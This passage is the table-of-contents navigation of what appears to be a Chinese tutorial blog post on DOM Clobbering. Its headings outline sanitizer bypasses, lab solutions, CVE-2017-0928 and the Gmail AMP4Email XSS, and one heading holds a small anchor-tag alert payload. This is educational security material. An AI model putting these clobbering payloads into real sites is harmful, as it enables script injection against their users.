class="nav-link" href="#0x02-简单的例子："><span class="nav-number">1.2.</span> <span class="nav-text">0x02 简单的例子：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-对象创建"><span class="nav-number">1.2.1.</span> <span class="nav-text">1.对象创建</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#测试代码如下："><span class="nav-number">1.2.1.1.</span> <span class="nav-text">测试代码如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#打印的结果如下："><span class="nav-number">1.2.1.2.</span> <span class="nav-text">打印的结果如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#通过上面的结果，可以看出来HTML标签中的id属性值被当做全局变量，name属性值被当成document的属性，这也就是为什么上面有一行输出undefined的原因。"><span class="nav-number">1.2.1.3.</span> <span class="nav-text">通过上面的结果，可以看出来HTML标签中的id属性值被当做全局变量，name属性值被当成document的属性，这也就是为什么上面有一行输出undefined的原因。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-方法的覆盖"><span class="nav-number">1.2.2.</span> <span class="nav-text">2.方法的覆盖</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#测试代码如下：-1"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">测试代码如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#结果如下："><span class="nav-number">1.2.2.2.</span> <span class="nav-text">结果如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#通过上面的输出结果显示我们可以通过name属性覆盖document中的内置方法。"><span class="nav-number">1.2.2.3.</span> <span class="nav-text">通过上面的输出结果显示我们可以通过name属性覆盖document中的内置方法。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-通过标签的层级关系构造变量的层级关系"><span class="nav-number">1.2.3.</span> <span class="nav-text">3.通过标签的层级关系构造变量的层级关系</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#测试代码如下：-2"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">测试代码如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#结果如下：-1"><span class="nav-number">1.2.3.2.</span> <span class="nav-text">结果如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#通过上面的结果我们看到，可以通过多层覆盖的方式，覆盖Window和document下的对象。"><span class="nav-number">1.2.3.3.</span> <span class="nav-text">通过上面的结果我们看到，可以通过多层覆盖的方式，覆盖Window和document下的对象。</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03-javascript-Scope"><span class="nav-number">1.3.</span> <span class="nav-text">0x03 javascript Scope</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#由于DOM-Clobbering-Attack的攻击中有很多的地方用到了javascript的作用域链，因此我们可以来了解一下："><span class="nav-number">1.3.1.</span> <span class="nav-text">由于DOM Clobbering Attack的攻击中有很多的地方用到了javascript的作用域链，因此我们可以来了解一下：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1-全局作用域："><span class="nav-number">1.3.2.</span> <span class="nav-text">1.全局作用域：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#在javascript中全局作用域一般是window-nodejs是global-。"><span class="nav-number">1.3.2.1.</span> <span class="nav-text">在javascript中全局作用域一般是window(nodejs是global)。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-显示声明："><span class="nav-number">1.3.3.</span> <span class="nav-text">2.显示声明：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-隐式声明："><span class="nav-number">1.3.4.</span> <span class="nav-text">3.隐式声明：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#不带有声明关键字的变量，js会默认帮你声明一个全局变量："><span class="nav-number">1.3.4.1.</span> <span class="nav-text">不带有声明关键字的变量，js会默认帮你声明一个全局变量：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#变量result被挂载到了window对象上了。"><span class="nav-number">1.3.4.2.</span> <span class="nav-text">变量result被挂载到了window对象上了。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-块级作用域："><span class="nav-number">1.3.5.</span> <span class="nav-text">4.块级作用域：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#在-ES6-之前，是没有块级作用域的概念的。如果你有-C-或者-Java-经验，想必你对块级作用域并不陌生："><span class="nav-number">1.3.5.1.</span> <span class="nav-text">在 ES6 之前，是没有块级作用域的概念的。如果你有 C++ 或者 Java 经验，想必你对块级作用域并不陌生：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#从上面的结果来看，说明var声明的变量，在for循环之后仍然保存在这个作用域里，而for-仍然在全局作用域里，因此var声明的变量在全局作用域里。"><span class="nav-number">1.3.5.2.</span> <span class="nav-text">从上面的结果来看，说明var声明的变量，在for循环之后仍然保存在这个作用域里，而for(){}仍然在全局作用域里，因此var声明的变量在全局作用域里。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们可以通过let-或const用来声明常量-来声明变量，实现块级作用域。"><span class="nav-number">1.3.5.3.</span> <span class="nav-text">我们可以通过let(或const用来声明常量)来声明变量，实现块级作用域。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#除了上面的几种作用域外还有语法作用域，动态作用域等，就不赘述了感兴趣的参考下面的链接。"><span class="nav-number">1.3.5.4.</span> <span class="nav-text">除了上面的几种作用域外还有语法作用域，动态作用域等，就不赘述了感兴趣的参考下面的链接。</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x04-覆盖函数"><span class="nav-number">1.4.</span> <span class="nav-text">0x04 覆盖函数</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#在介绍覆盖函数之前我们，先看一个奇怪的操作："><span class="nav-number">1.4.0.1.</span> <span class="nav-text">在介绍覆盖函数之前我们，先看一个奇怪的操作：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#上面是javascript的比较特别之处。"><span class="nav-number">1.4.0.2.</span> <span class="nav-text">上面是javascript的比较特别之处。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#虽然我们无法通过标签来定义一个函数，但是我们在一定的场景下可以用来绕过一些判断："><span class="nav-number">1.4.0.3.</span> <span class="nav-text">虽然我们无法通过标签来定义一个函数，但是我们在一定的场景下可以用来绕过一些判断：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#第一个JS代码块虽然引起了报错，但是不会引起JS完全停止执行JS会跳过这个报错的代码块，执行下一个代码块。"><span class="nav-number">1.4.0.4.</span> <span class="nav-text">第一个JS代码块虽然引起了报错，但是不会引起JS完全停止执行JS会跳过这个报错的代码块，执行下一个代码块。</span></a></li></ol></li></ol><li class="nav-item nav-level-4"><a class="nav-link" href="#0x05-攻击方法："><span class="nav-number">1.5.</span> <span class="nav-text">0x05 攻击方法：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-为了分析DOM-Clobbering漏洞，假设如下代码："><span class="nav-number">1.5.1.</span> <span class="nav-text">1.为了分析DOM Clobbering漏洞，假设如下代码：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#如果我们想利用Dom-Clobbering技巧来执行任意的js，需要解决两个问题："><span class="nav-number">1.5.1.1.</span> <span class="nav-text">如果我们想利用Dom Clobbering技巧来执行任意的js，需要解决两个问题：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#1-利用html标签的属性id，很容易在window对象上创建任意的属性，但是我们能在新对象上创建新属性吗？"><span class="nav-number">1.5.1.2.</span> <span class="nav-text">1)利用html标签的属性id，很容易在window对象上创建任意的属性，但是我们能在新对象上创建新属性吗？</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-怎么控制DOM-elements被强制转为string之后的值，大多数的dom节点被转为string后是-object-HTMLInputElement-。"><span class="nav-number">1.5.1.3.</span> <span class="nav-text">2)怎么控制DOM elements被强制转为string之后的值，大多数的dom节点被转为string后是[object HTMLInputElement]。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们可以用前面的例子来解决第一个问题："><span class="nav-number">1.5.1.4.</span> <span class="nav-text">我们可以用前面的例子来解决第一个问题：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们可以用下面的一段代码来枚举，html存在的所有标签，然后检查其dom节点对象有没有实现toString方法，或者是继承于Object-ptototype。如果是继承自Object-prototype-那么很有可能只会返回-object-SomeElement"><span class="nav-number">1.5.1.5.</span> <span class="nav-text">我们可以用下面的一段代码来枚举，html存在的所有标签，然后检查其dom节点对象有没有实现toString方法，或者是继承于Object.ptototype。如果是继承自Object.prototype,那么很有可能只会返回[object SomeElement]</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们可以得到两个对象-HTMLAreaElement-lt-area-gt-和HTMLAnchorElement-lt-a-gt-，这两个标签的toString会直接返回他的href属性。"><span class="nav-number">1.5.1.6.</span> <span class="nav-text">我们可以得到两个对象:HTMLAreaElement (&lt;area&gt;)和HTMLAnchorElement (&lt;a&gt;)，这两个标签的toString会直接返回他的href属性。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#结合上面的两个问题，我们会构造如下payload"><span class="nav-number">1.5.1.7.</span> <span class="nav-text">结合上面的两个问题，我们会构造如下payload:</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#但是test1-test2是undefined，这是因为-lt-input-gt-元素会变成-lt-form-gt-的属性，但-lt-a-gt-标签并不会。"><span class="nav-number">1.5.1.8.</span> <span class="nav-text">但是test1.test2是undefined，这是因为&lt;input&gt;元素会变成&lt;form&gt;的属性，但&lt;a&gt;标签并不会。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们可以通过构造一个HTMLCollection来解决问题，例如："><span class="nav-number">1.5.1.9.</span> <span class="nav-text">我们可以通过构造一个HTMLCollection来解决问题，例如：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#返回的集合如下所示："><span class="nav-number">1.5.1.10.</span> <span class="nav-text">返回的集合如下所示：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#HTMLCollection可以通过index访问，同时可以使用id访问，并且可以使用name访问，例如："><span class="nav-number">1.5.1.11.</span> <span class="nav-text">HTMLCollection可以通过index访问，同时可以使用id访问，并且可以使用name访问，例如：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#因此上面的问题得到解决，通过构造如下payload"><span class="nav-number">1.5.1.12.</span> <span class="nav-text">因此上面的问题得到解决，通过构造如下payload:</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#lt-a-id-quot-test1-quot-gt-lt-a-gt-lt-a-id-quot-test1-quot-name-quot-test2-quot-href-quot-jacascript-alert-1-quot-gt-lt-a-gt"><span class="nav-number">1.5.1.13.</span> <span class="nav-text">&lt;a id=&quot;test1&quot;&gt;&lt;/a&gt;&lt;a id=&quot;test1&quot; name=&quot;test2&quot; href=&quot;jacascript:alert(1)&quot;&gt;&lt;/a&gt;</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#成功执行。"><span class="nav-number">1.5.1.14.</span> <span class="nav-text">成功执行。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-确定DOM元素间的关系"><span class="nav-number">1.5.2.</span> <span class="nav-text">2.确定DOM元素间的关系</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#我们把两个HTML元素相邻放置，分别为其分配一个ID，然后检查第一个元素是否具有第二个元素的属性。代码如下："><span class="nav-number">1.5.2.1.</span> <span class="nav-text">我们把两个HTML元素相邻放置，分别为其分配一个ID，然后检查第一个元素是否具有第二个元素的属性。代码如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#上面是我们用html标签的id属性来寻找DOM之间的关系的过程，结果如下："><span class="nav-number">1.5.2.2.</span> <span class="nav-text">上面是我们用html标签的id属性来寻找DOM之间的关系的过程，结果如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#如果我们要覆盖一个对象的x-y-value值，可以用下面的这种方式："><span class="nav-number">1.5.2.3.</span> <span class="nav-text">如果我们要覆盖一个对象的x.y.value值，可以用下面的这种方式：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-使用form标签来伪造三层的对象引用"><span class="nav-number">1.5.3.</span> <span class="nav-text">3.使用form标签来伪造三层的对象引用</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#在Chrome中，当form标签有两个一样的id的input标签时，Chrome会将其处理为-object-RadioNodeList-，这个可以用forEach来遍历："><span class="nav-number">1.5.3.1.</span> <span class="nav-text">在Chrome中，当form标签有两个一样的id的input标签时，Chrome会将其处理为[object RadioNodeList]，这个可以用forEach来遍历：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-是否自定义的DOM节点也具有上面的属性呢？"><span class="nav-number">1.5.4.</span> <span class="nav-text">4.是否自定义的DOM节点也具有上面的属性呢？</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#我们可以通过下面的代码来测试一下dom中有哪些属性可以用："><span class="nav-number">1.5.4.1.</span> <span class="nav-text">我们可以通过下面的代码来测试一下dom中有哪些属性可以用：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#上面的代码显示的是string类型的属性，他们并不一定可控，为了检查他们是否可读写，我们可以用下面的代码："><span class="nav-number">1.5.4.2.</span> <span class="nav-text">上面的代码显示的是string类型的属性，他们并不一定可控，为了检查他们是否可读写，我们可以用下面的代码：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#通过上面的输出结果可以有："><span class="nav-number">1.5.4.3.</span> <span class="nav-text">通过上面的输出结果可以有：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#对于上面的DOM属性中，我们需要关注的是username和password属性，他们是a标签的节点属性并不是html中定义的属性，这两个属性可以通过url的中的username字段和password字段提供，但是需要有-符号："><span class="nav-number">1.5.4.4.</span> <span class="nav-text">对于上面的DOM属性中，我们需要关注的是username和password属性，他们是a标签的节点属性并不是html中定义的属性，这两个属性可以通过url的中的username字段和password字段提供，但是需要有@符号：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#上面不仅可以用ftp协议，也可以用http协议-必须加-，需要注意的是，如果我们直接通过toString函数将dom转换为字符串他的href是经过url编码的，不过我们可以通过一个不存在的协议绕过abc-lt-gt-："><span class="nav-number">1.5.4.5.</span> <span class="nav-text">上面不仅可以用ftp协议，也可以用http协议(必须加//)，需要注意的是，如果我们直接通过toString函数将dom转换为字符串他的href是经过url编码的，不过我们可以通过一个不存在的协议绕过abc:&lt;&gt;：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-获取3级以上的对象引用"><span class="nav-number">1.5.5.</span> <span class="nav-text">5.获取3级以上的对象引用</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#Terjanq提到，可以结合iframe的srcdoc属性构造任意层数的对象引用。"><span class="nav-number">1.5.5.1.</span> <span class="nav-text">@Terjanq提到，可以结合iframe的srcdoc属性构造任意层数的对象引用。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#例子如下："><span class="nav-number">1.5.5.2.</span> <span class="nav-text">例子如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#上面用到了setTimeout设置一个定时器是为了保证iframe框架的加载完成。我们可以利用style-link来加载外部样式表来造成延迟："><span class="nav-number">1.5.5.3.</span> <span class="nav-text">上面用到了setTimeout设置一个定时器是为了保证iframe框架的加载完成。我们可以利用style/link来加载外部样式表来造成延迟：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x06-攻击实例："><span class="nav-number">1.6.</span> <span class="nav-text">0x06 攻击实例：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-clobbering-to-enable-XSS-lab"><span class="nav-number">1.6.1.</span> <span class="nav-text">1.clobbering to enable XSS lab</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#实验之前先看一个简单的例子："><span class="nav-number">1.6.1.1.</span> <span class="nav-text">实验之前先看一个简单的例子：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这个实验就有点类似下面这个例子："><span class="nav-number">1.6.1.2.</span> <span class="nav-text">这个实验就有点类似下面这个例子：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#通过查看源代码我们可以看到这个文件：loadCommentsWithDomClobbering-js，我们可以看到下面的获取图片src的代码："><span class="nav-number">1.6.1.3.</span> <span class="nav-text">通过查看源代码我们可以看到这个文件：loadCommentsWithDomClobbering.js，我们可以看到下面的获取图片src的代码：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#avatar的默认值是-resources-images-avatarDefault-svg，我们可以通过覆盖window-defaultAvatar来实现xss，构造的payload如下："><span class="nav-number">1.6.1.4.</span> <span class="nav-text">avatar的默认值是/resources/images/avatarDefault.svg，我们可以通过覆盖window.defaultAvatar来实现xss，构造的payload如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#插入的标签如下："><span class="nav-number">1.6.1.5.</span> <span class="nav-text">插入的标签如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#为什么我们要把闭合前面的-quot-编码为-amp-quot-，因为cid是没有这个协议的，因此不会对-quot-进行url编码。这样在解码时-amp-quot-就变成了控制字符-quot-改变页面结构。"><span class="nav-number">1.6.1.6.</span> <span class="nav-text">为什么我们要把闭合前面的&quot;编码为&amp;quot;，因为cid是没有这个协议的，因此不会对&quot;进行url编码。这样在解码时&amp;quot;就变成了控制字符&quot;改变页面结构。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#然后再评论一次，刷新全局变量，加载loadCommentsWithDomClobbering-js即可导致xss。"><span class="nav-number">1.6.1.7.</span> <span class="nav-text">然后再评论一次，刷新全局变量，加载loadCommentsWithDomClobbering.js即可导致xss。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-Clobbering-attributes-lab"><span class="nav-number">1.6.2.</span> <span class="nav-text">2.Clobbering attributes lab</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#实验之前我们先来看一个例子："><span class="nav-number">1.6.2.1.</span> <span class="nav-text">实验之前我们先来看一个例子：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#payload如下："><span class="nav-number">1.6.2.2.</span> <span class="nav-text">payload如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#由于attributes被覆盖导致执行到payload的form时跳过for循环跳过黑名单，成功执行xss。"><span class="nav-number">1.6.2.3.</span> <span class="nav-text">由于attributes被覆盖导致执行到payload的form时跳过for循环跳过黑名单，成功执行xss。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#跟上面一样我们先看看loadCommentsWithHtmlJanitor-js的代码。"><span class="nav-number">1.6.2.4.</span> <span class="nav-text">跟上面一样我们先看看loadCommentsWithHtmlJanitor.js的代码。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#在这里最终对标签的属性进行了检查，对每个node的属性都进行了白名单检查："><span class="nav-number">1.6.2.5.</span> <span class="nav-text">在这里最终对标签的属性进行了检查，对每个node的属性都进行了白名单检查：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#但是上面有个很危险的行为使用了node-attributes-length，如果我们通过覆盖attributes会发生上面呢？"><span class="nav-number">1.6.2.6.</span> <span class="nav-text">但是上面有个很危险的行为使用了node.attributes.length，如果我们通过覆盖attributes会发生上面呢？</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#上面的代码会输出一个NamedNodeMap对象，id-39-x-39-。"><span class="nav-number">1.6.2.7.</span> <span class="nav-text">上面的代码会输出一个NamedNodeMap对象，id=&#39;x&#39;。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#上面这段代码会输出-lt-img-name-attributes-gt-，成功的覆盖了原来的node-attributes，导致跳出了for循环。"><span class="nav-number">1.6.2.8.</span> <span class="nav-text">上面这段代码会输出&lt;img name=attributes&gt;，成功的覆盖了原来的node.attributes，导致跳出了for循环。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#结合上面的例子我们可以通过构造-lt-form-id-x-gt-lt-input-id-attributes-gt-的形式来绕过。"><span class="nav-number">1.6.2.9.</span> <span class="nav-text">结合上面的例子我们可以通过构造&lt;form id=x&gt;&lt;input id=attributes&gt;的形式来绕过。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#根据题目的要求，需要访问触发，并且通过参考资料得知利用tabindex属性和form的onfocus来执行xss。"><span class="nav-number">1.6.2.10.</span> <span class="nav-text">根据题目的要求，需要访问触发，并且通过参考资料得知利用tabindex属性和form的onfocus来执行xss。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#因此构造如下："><span class="nav-number">1.6.2.11.</span> <span class="nav-text">因此构造如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#但是我们要解决这个lab需要提交到该漏洞利用的漏洞实验室，而且用户直接点击是不会触发xss的，因此我们要构造一个在评论后主动访问并且加上-x，为了等待评论完成我们需要延迟一下，因此构造下面的payload"><span class="nav-number">1.6.2.12.</span> <span class="nav-text">但是我们要解决这个lab需要提交到该漏洞利用的漏洞实验室，而且用户直接点击是不会触发xss的，因此我们要构造一个在评论后主动访问并且加上#x，为了等待评论完成我们需要延迟一下，因此构造下面的payload:</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#直接提交完成lab。"><span class="nav-number">1.6.2.13.</span> <span class="nav-text">直接提交完成lab。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-CVE-2017-0928-Bypassing-sanitization-using-DOM-clobbering"><span class="nav-number">1.6.3.</span> <span class="nav-text">3.CVE-2017-0928 Bypassing sanitization using DOM clobbering</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#html-janitor也就是我们上文用到的-HTML-filters，在-v2-0-2-当中，janitor-在循环中有这么几行代码："><span class="nav-number">1.6.3.1.</span> <span class="nav-text">html-janitor也就是我们上文用到的 HTML filters，在 v2.0.2 当中，janitor 在循环中有这么几行代码：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#用-sanitized作为标志位来标志是否已经进行标准化，但是这里，由我们上个例子可以得出，我们可以利用与上个例子类似的-payload-绕过第一个-if-就可以绕过标准化过滤了。"><span class="nav-number">1.6.3.2.</span> <span class="nav-text">用_sanitized作为标志位来标志是否已经进行标准化，但是这里，由我们上个例子可以得出，我们可以利用与上个例子类似的 payload 绕过第一个 if 就可以绕过标准化过滤了。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#修复方案是删除了这些判断，对子树利用递归形式进行标准化过滤。"><span class="nav-number">1.6.3.3.</span> <span class="nav-text">修复方案是删除了这些判断，对子树利用递归形式进行标准化过滤。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-XSS-in-GMail’s-AMP4Email-via-DOM-Clobbering"><span class="nav-number">1.6.4.</span> <span class="nav-text">4.XSS in GMail’s AMP4Email via DOM Clobbering</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#这是我们OWASP-Top-10提名的攻击实例，作者首先在控制台输入window进行fuzz。"><span class="nav-number">1.6.4.1.</span> <span class="nav-text">这是我们OWASP Top 10提名的攻击实例，作者首先在控制台输入window进行fuzz。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这里他首先利用了AMP，尝试插入-lt-a-id-AMP-gt-，但是这个AMP被禁止了。"><span class="nav-number">1.6.4.2.</span> <span class="nav-text">这里他首先利用了AMP，尝试插入&lt;a id=AMP&gt;，但是这个AMP被禁止了。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#接着找到下一个AMP-MODE，这个没有被禁止，反而让作者发现了这里加载失败的-URL-当中有一个undefined。"><span class="nav-number">1.6.4.3.</span> <span class="nav-text">接着找到下一个AMP_MODE，这个没有被禁止，反而让作者发现了这里加载失败的 URL 当中有一个undefined。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#该作者插入了-lt-a-id-AMP-MODE-gt-导致产生的undefined，主要产生这个问题的代码经作者简化后是这样的："><span class="nav-number">1.6.4.4.</span> <span class="nav-text">该作者插入了&lt;a id=AMP_MODE&gt;导致产生的undefined，主要产生这个问题的代码经作者简化后是这样的：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这段代码还可以在简化："><span class="nav-number">1.6.4.5.</span> <span class="nav-text">这段代码还可以在简化：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#所以我们可以用-Dom-Clobbering-来让它加载我们任意的-js-文件，直接劫持protocol到我们任意-URL，再利用-注释掉后面的即可。"><span class="nav-number">1.6.4.6.</span> <span class="nav-text">所以我们可以用 Dom Clobbering 来让它加载我们任意的 js 文件，直接劫持protocol到我们任意 URL，再利用#注释掉后面的即可。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#虽然-URL-构造出来了，但是-Google-还有-CSP"><span class="nav-number">1.6.4.7.</span> <span class="nav-text">虽然 URL 构造出来了，但是 Google 还有 CSP</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#虽然他当时没绕过，但是-Google-还是全额地给了他奖金。"><span class="nav-number">1.6.4.8.</span> <span class="nav-text">虽然他当时没绕过，但是 Google 还是全额地给了他奖金。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#不过后来有前辈经过研究可以通过-252f的trick进行绕过，其实就是利用url的目录穿梭绕过，例如："><span class="nav-number">1.6.4.9.</span> <span class="nav-text">不过后来有前辈经过研究可以通过..%252f的trick进行绕过，其实就是利用url的目录穿梭绕过，例如：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x07-学而不思则罔-思而不学则殆"><span class="nav-number">1.7.</span> <span class="nav-text">0x07 学而不思则罔 思而不学则殆</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-Document-amp-id"><span class="nav-number">1.7.1.</span> <span class="nav-text">1.Document &amp; id</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#我们只得到了object标签可以通过document的id进行直接获取："><span class="nav-number">1.7.1.1.</span> <span class="nav-text">我们只得到了object标签可以通过document的id进行直接获取：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-Document-amp-Name"><span class="nav-number">1.7.2.</span> <span class="nav-text">2.Document &amp; Name</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#我们可以得到以下5个元素可以通过document的name来获取。"><span class="nav-number">1.7.2.1.</span> <span class="nav-text">我们可以得到以下5个元素可以通过document的name来获取。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-Document-amp-Name-amp-Id"><span class="nav-number">1.7.3.</span> <span class="nav-text">3.Document &amp; Name &amp; Id</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#我们可以得到下面3个元素是可以通过document-39-id-39-和document-39-name-39-来获取的。"><span class="nav-number">1.7.3.1.</span> <span class="nav-text">我们可以得到下面3个元素是可以通过document[&#39;id&#39;]和document[&#39;name&#39;]来获取的。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-Window-amp-Id"><span class="nav-number">1.7.4.</span> <span class="nav-text">4.Window &amp; Id</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#我们可以通过window的id直接获取的元素有："><span class="nav-number">1.7.4.1.</span> <span class="nav-text">我们可以通过window的id直接获取的元素有：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们不可以通过window的id获取的元素。"><span class="nav-number">1.7.4.2.</span> <span class="nav-text">我们不可以通过window的id获取的元素。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#PS-这部分并不是真正不能-Clobbered-，因为比如说body，因为我本身界面存在一个body标签，只是在我测试构建的简单的-HTML-页面中，这些标签不能被-Clobbered-，而且在实际中也用到比较少。并且根据-Chromium-中的说法是”but-anything-by-id”，所以如果需要通过Window-id的形式去获取标签的话，还有很多标签可以使用，或者也可以尽力去构建下文的要求。"><span class="nav-number">1.7.4.3.</span> <span class="nav-text">PS: 这部分并不是真正不能 Clobbered ，因为比如说body，因为我本身界面存在一个body标签，只是在我测试构建的简单的 HTML 页面中，这些标签不能被 Clobbered ，而且在实际中也用到比较少。并且根据 Chromium 中的说法是”but anything by id”，所以如果需要通过Window.id的形式去获取标签的话，还有很多标签可以使用，或者也可以尽力去构建下文的要求。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-Window-amp-Name"><span class="nav-number">1.7.5.</span> <span class="nav-text">5.Window &amp; Name</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#这里与-document-一致，只有五个标签可以让window通过-name-进行直接获取"><span class="nav-number">1.7.5.1.</span> <span class="nav-text">这里与 document 一致，只有五个标签可以让window通过 name 进行直接获取</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x08-总结"><span class="nav-number">1.8.</span> <span class="nav-text">0x08 总结</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#当我们输入的字符被过滤，不能xss时，但是又能输出标签时，是不是可以考虑DOM-Clobbering-Attack呢？"><span class="nav-number">1.8.0.1.</span> <span 